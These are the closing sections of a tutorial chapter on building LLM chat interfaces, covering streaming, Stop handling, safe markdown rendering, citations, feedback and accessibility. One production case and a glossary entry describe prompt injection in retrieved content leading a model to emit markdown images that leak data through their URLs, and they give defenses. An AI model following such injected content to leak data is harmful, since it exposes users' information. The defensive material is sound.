## Best practices

- Model each turn as an explicit state machine and derive every button
  from the state.
- Use `fetch` with a stream reader for POST-based chat; parse events with
  a buffer and a streaming `TextDecoder`.
- Make Stop abort the request end to end, keep and label partial text,
  and treat a stream without a `done` event as an error.
- Show the user's message optimistically and never lose its text on
  failure.
- Batch token updates and memoize finished markdown blocks.
- Render model output with react-markdown (or a sanitizer), never with
  `dangerouslySetInnerHTML`; allowlist image hosts and add a CSP.
- Build source URLs on the server, validate citation markers in the
  client, and show snippets.
- Attach model, prompt version, and trace ID to feedback on the server,
  and route thumbs-down cases into a review queue that feeds eval sets.
- Announce state changes through one `role="status"` region; keep focus
  in the input; make Stop keyboard reachable.

## In production

- **The browser tab freezes during long answers.**
  *Detect:* long tasks in the browser's performance profile while
  streaming; real-user interaction latency spikes on long chats. *Cause:*
  re-rendering and re-parsing the full message on every token. *Fix:*
  throttle updates, memoize completed blocks, and virtualize long
  transcripts.
- **An answer looks complete but stops mid-sentence.**
  *Detect:* answers without a final `done` event in client telemetry;
  users report truncated answers after deploys. *Cause:* a proxy timeout
  or server restart closed the stream cleanly and the UI treated the end
  of the body as success. *Fix:* require the `done` event, mark anything
  else interrupted with Retry, and raise the proxy's streaming timeouts
  (see
  [streaming responses end to end](../hosted-model-apis/streaming-responses-end-to-end.md)).
- **Users press Stop but token usage does not drop.**
  *Detect:* provider usage for stopped messages matches full-length
  answers. *Cause:* the relay does not cancel the upstream request when
  the browser disconnects. *Fix:* propagate the abort to the provider
  call and record the stop in telemetry.
- **A security review finds a model-produced image leaking data.**
  *Detect:* requests from users' browsers to unknown image hosts in CSP
  violation reports or proxy logs. *Cause:* markdown images rendered
  from any URL, combined with prompt injection in retrieved content.
  *Fix:* allowlist image hosts in the renderer, add `img-src` to the CSP,
  and add an injection test case to the eval set.
- **Screen reader users cannot use the assistant.**
  *Detect:* accessibility audit or user reports of nonstop announcements.
  *Cause:* the streaming message is a live region, so every token is
  announced. *Fix:* remove the live region from the message, announce
  state changes through one status element, and test with screen readers.
- **Feedback volume is high but nothing improves.**
  *Detect:* thousands of votes, no new eval cases, and no change in the
  Not helpful rate between prompt versions. *Cause:* votes stored without
  model, prompt version, or trace, and no review process. *Fix:* attach
  context on the server, sample thumbs-down votes into a review queue,
  and turn reviewed cases into eval set entries that run in CI.

## Important terminology

- **Time to first token (TTFT):** Delay between sending a request and the
  first streamed text appearing.
- **Server-sent events (SSE):** A text format for a stream of named
  events over one HTTP response.
- **AbortController:** The browser API that cancels a `fetch` and closes
  its connection.
- **Optimistic UI:** Showing the result of a user action before the
  server confirms it, with rollback on failure.
- **Regenerate:** Requesting a new answer to the same user message,
  replacing or paging past the previous one.
- **Improper output handling:** Passing model output to a browser or
  system without validation or encoding (OWASP LLM05).
- **Image exfiltration:** Leaking data through the URL of an image that
  the browser loads automatically.
- **Citation marker:** A placeholder such as `[S2]` that the UI turns into
  a link to a retrieved source.
- **Explicit and implicit feedback:** Ratings users give on purpose, and
  signals inferred from what they do.
- **Live region:** An element whose changes assistive technologies
  announce without moving focus.

## Common mistakes and misconceptions

- Using `EventSource` for a POST chat endpoint, or parsing each network
  chunk as if it were one complete event.
- Treating the end of the response body as success without a `done`
  event.
- A Stop button that hides the stream but leaves the model generating.
- Clearing the input before the request is safely stored, so a failure
  loses the user's text.
- Rendering model markdown through `innerHTML`, or allowing images from
  any host.
- Trusting URLs or citation IDs that the model wrote.
- Storing a thumbs down without the model, prompt version, or trace that
  produced the answer.
- Making the streaming message a live region.

## Revision questions

1. Why does TaskFlow read the chat stream with `fetch` instead of
   `EventSource`, and why must the parser buffer across chunks?
2. A model streams 40 tokens per second and the first token arrives after
   800 ms. How long until a 1,000-token answer completes, and how long is
   the user waiting before they can start reading? (Answer: 0.8 + 1,000 /
   40 = 25.8 seconds to finish; 0.8 seconds before reading starts.)
3. What must happen on the server when the user presses Stop, and what
   should the UI do with the partial text?
4. Describe the optimistic update for sending a message and what happens
   when the request never reaches the server.
5. List three ways rendered model markdown can harm a user, and the
   defense against each.
6. Why are source URLs built on the server, and what does the UI do with
   a citation marker whose ID was never retrieved?
7. What context must a feedback record carry to be useful for
   evaluations, and why should the server add it?
8. How do you make a streaming answer accessible without flooding a
   screen reader?

## Further learning

- [AI SDK: Chatbot (useChat)](https://ai-sdk.dev/docs/ai-sdk-ui/chatbot)
- [react-markdown](https://github.com/remarkjs/react-markdown)
- [OWASP LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)
- [MDN: Using readable streams](https://developer.mozilla.org/en-US/docs/Web/API/Streams_API/Using_readable_streams)
- [MDN: ARIA log role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Roles/log_role)
- [W3C: Understanding Status Messages](https://www.w3.org/WAI/WCAG22/Understanding/status-messages.html)
- [Google PAIR Guidebook: Feedback + Control](https://pair.withgoogle.com/chapter/feedback-controls/)
- Next: [AI frameworks and SDKs](ai-frameworks-and-sdks.md). Back to the [building AI applications overview](../building-ai-applications.md).
